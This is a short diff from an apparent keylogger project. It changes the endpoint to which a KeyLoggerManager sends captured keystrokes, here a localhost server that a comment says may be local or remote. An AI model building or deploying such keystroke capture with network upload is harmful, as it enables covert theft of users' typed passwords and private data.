@@ -45,7 +45,7 @@ if __name__ == "__main__":
     # for use file + network :
     manager = KeyLoggerManager(
         file_path="encrypt.txt",
-        network_url="http://127.0.0.1:5000/post"  # serveur local ou distant
+        network_url="http://127.0.0.1:5000/api/upload"  # serveur local ou distant
     )
 
     manager.start_logger()
